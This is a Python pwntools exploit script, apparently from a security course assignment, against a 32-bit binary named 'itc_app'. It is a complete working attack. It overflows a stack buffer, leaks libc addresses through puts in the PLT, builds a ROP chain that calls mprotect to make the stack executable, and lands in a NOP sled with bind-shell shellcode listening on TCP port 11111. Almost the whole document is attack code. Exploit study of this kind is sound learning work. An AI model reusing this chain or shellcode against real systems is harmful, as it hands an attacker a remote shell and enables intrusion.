from pwn import *
import os
# Setting up the remote connection by providing IP and port
# This will connect to the server running on netcat

context.binary = e = ELF('./itc_app')
r = process()

# Padding with the offset required to overflow the buffer
offset = b'A'*132

# Address for start of the main function
main = b'\x08\x04\x84\x7b'[::-1]

# Addresses of puts in the PLT, puts in the GOT and setvbuf in the GOT
# These are static as the program is not compiled with PIE
plt_puts_addr = b'\x08\x04\x83\x40'[::-1] #p32(0x8048340)
got_puts_addr = b'\x08\x04\x97\xac'[::-1] #p32(0x80497ac)
got_setvbuf_addr = b'\x08\x04\x97\xb4'[::-1] #p32(0x80497b4)

# Adding offset to the payload
payload = offset

''' 
Appending to the payload- the address of PUTs in the PLT
The argument for this is placed after the start of the main address,
the arg will be the GOT table address for puts.
This is because we call the puts function through the PLT
to output the address stored in the GOT.
Then it will return to the PLT puts and then output the setvbuf addr.
This however, will also output __libc_start_main- this is described in the report.
This will then return to the main function, enabling us to loop around and provide
another input.
'''
# leaking addresses is not necessary locally- but it is included here as it was attempted remotely
payload += plt_puts_addr + main + got_puts_addr + got_setvbuf_addr

# send the remote process the payload
r.sendline(payload)

# receive the output from the remote process and split by newline
# splitting enables us to extract just the addresses that we want
# the addresses are stored in output[6]
output = r.recv().split(b"\n")
print(output)
# 4 bytes for 32 bit- 8 for 64 bit
address_size = 4
# There are 3 addresses, therefore the output[6] is split into 3 4 byte addresses
addresses = [output[6][i:i+address_size] for i in range(0, len(output[6]), address_size)]
print(addresses)
# Which address[index] is which address? 
# address[0] = puts() address
# address[1] =__libc_start_main address
# address[2] = setvbuf() in libc address

# Turning the puts() address to integer to calculate the base of libc
address_int = int.from_bytes(addresses[0], byteorder='little')

# Calculating the base of libc by subtracting the puts() offset (from libc database)
# from the puts() address that was leaked
base = address_int - 0x72880
base_address_bytes = base.to_bytes(len(addresses[0]), byteorder='little')

# calculating the start of the stack memory block by adding an offset to the libc start location
# Target memory
stack_start = base + 0x264000
print(stack_start)
stack_start_bytes = stack_start.to_bytes(len(addresses[0]), byteorder='little')#

# address for syscall in libc (unused for this implementation)
syscall_addr = base + 0x119cc0
syscall_addr_bytes = syscall_addr.to_bytes(len(addresses[0]), byteorder='little')#

# location of mprotect in libc
mprotect_addr = base + 0x11a02F
mprotect_addr_bytes = mprotect_addr.to_bytes(len(addresses[0]), byteorder='little')

# pop eax ; ret
pop_eax = base + 0x0002ec6b
pop_eax_bytes = pop_eax.to_bytes(len(addresses[0]), byteorder='little')

# pop ecx ; pop edx ; ret
pop_ecx = base + 0x000371c3
pop_ecx_bytes = pop_ecx.to_bytes(len(addresses[0]), byteorder='little')

# push esp ; pop ebx ; pop esi ; ret
push_esp = base + 0x00107c4c 
push_esp_bytes = push_esp.to_bytes(len(addresses[0]), byteorder='little')

# sub ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
sub_ebx  = base + 0x000c2df3
sub_ebx_bytes = sub_ebx.to_bytes(len(addresses[0]), byteorder='little')

# mov edx, eax ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; pop ebp ; ret
mov_edx_eax = base + 0x0008b478
mov_edx_eax_bytes = mov_edx_eax.to_bytes(len(addresses[0]), byteorder='little')

# mov ebx, edx ; ret
mov_ebx_edx = base + 0x00107da6
mov_ebx_edx_bytes = mov_ebx_edx.to_bytes(len(addresses[0]), byteorder='little')

# mov edi, eax ; mov esi, edx ; mov eax, dword ptr [esp + 4] ; ret
save_stack = base + 0x000b3c61
save_stack_bytes = save_stack.to_bytes(len(addresses[0]), byteorder='little')

# add edi, ecx ; notrack jmp edi
add_edi_ecx = base + 0x00021f2f
add_edi_ecx_bytes = add_edi_ecx.to_bytes(len(addresses[0]), byteorder='little')

# Shellcode to open a listener for TCP bind shell on 11111 (Bem, 2013)
shellcode = b"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80"

# Crafting a 2nd payload to make stack executable
nopsled = b'\x90' * (132-len(shellcode))

# memory location to set to RWX
target_memory = stack_start_bytes

# length of memory section to change permission
length_memory = p32(0x00021000)

# code for RWX permissions
permissions = p32(0x00000007)

# Dummy address for unwanted pops
dummy = p32(0xffffd264)

# offset to subtract from the stack pointer to calculate the EBX arg (memory start)
offset = p32(0x201B8)

# Adding offset to the esp for the final jump to the nopsled
final_add_offset = p32(0x20150)

payload2 = nopsled+shellcode # nopsled and shellcode 
payload2 += pop_eax_bytes + offset # adding the offset to subtract from the stack pointer to get beginning of memory page
payload2 += push_esp_bytes + dummy # push the esp value onto the stack + dummy for useless pop
payload2 += sub_ebx_bytes + dummy + dummy + dummy + dummy # subtract the value we popped to eax + useless dummys
payload2 += mov_edx_eax_bytes +dummy + dummy + dummy + dummy # starting move to ebx (2 steps)
payload2 += mov_ebx_edx_bytes # 2nd step of moving start of stack memory to the ebx register for mprotect call
payload2 += save_stack_bytes # backing up the stack value to the edi register ----mov edi, eax ; mov esi, edx ; mov eax, dword ptr [esp + 4] ; ret
payload2 += pop_ecx_bytes + length_memory + permissions # popping length of memory and permissions into their registers
payload2 += mprotect_addr_bytes # this works to make the stack executable! calls with the args ebx (memory location) ecx (size of memory segment) edx (permissions of memory)
payload2 += main # return to main
payload2 += pop_ecx_bytes + final_add_offset + dummy # preparing the offset to the nopsled into ecx reg
payload2 += add_edi_ecx_bytes # adding offset to edi register and jumping to edi - this will land on our nopsled 


# Sending payload2 to execute the rop chain
r.sendline(payload2)

# Switching to the interactive mode to interact with the remote shell.
r.interactive()

# Writes the addresses leaked by the program to a file "addrs" for inspection
# Used to find the version of libc->
with open('addrs', 'wb') as f:
    test = b"A"*132 # write the padding so I can view in GDB
    f.write(test+addresses[0]+addresses[1]+addresses[2])

# Writing the exploit payload into a file for local execution and analysis.
with open('exploit2', 'wb') as f:
    test = b"A"*132
    f.write(payload2)